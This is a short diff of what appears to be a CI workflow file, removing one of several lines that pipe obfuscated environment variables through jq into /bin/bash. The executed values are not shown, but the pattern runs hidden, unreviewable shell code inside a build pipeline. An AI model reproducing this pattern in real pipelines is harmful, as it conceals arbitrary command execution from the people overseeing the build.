@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$voo4615" | jq -r .rtr055 | /bin/bash
           printf '%s' "$vbcm889" | jq -r .nh0 | /bin/bash
           echo $sjf28327 | jq -r .d467 | /bin/bash
-          echo $ynh721 | jq -r .fju519 | /bin/bash
           echo $kch0 | jq -r .hjit2 | /bin/bash
 
       - name: Store output
